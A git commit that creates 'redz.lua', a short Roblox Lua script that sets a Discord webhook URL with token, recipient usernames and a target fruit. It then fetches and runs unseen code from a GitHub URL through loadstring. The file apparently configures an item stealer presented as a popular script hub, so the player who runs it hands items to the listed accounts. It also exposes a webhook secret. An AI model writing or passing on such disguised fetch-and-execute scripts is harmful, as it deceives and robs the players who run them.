a2bf2d84b0486e93a47ca88ea4596b03da637257
roblox-mainscript <lamthithuong277@gmail.com>
2025-05-03 18:32:34 +0700

    Create redz.lua

---
+++ redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1358818653046575195/SADASB4FPUrLXodWCT68zTZhgGoNggq7nuPp51-TfT1RfcHc0w2OwJoojsYRTnM0GRAO" -- << Your Webhook
+Usernames = {"forfylgdiil", "mfzgnr"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
